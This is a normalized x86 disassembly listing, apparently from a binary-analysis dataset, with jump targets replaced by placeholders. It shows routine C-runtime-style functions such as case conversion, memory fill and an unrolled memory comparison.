jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ecx [ ebp - 0x7 ]
xor eax eax
mov ah [ ebp - 0x8 ]
or eax ecx
movzx eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_406b1b
add esp 0x24
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4031ad
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ esp + 0x8 ]
call sub_403096
pop ecx
pop ecx
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
retn
add eax 0x20
retn
sub_4031e0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_406d65
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_40325a
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_40485a ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
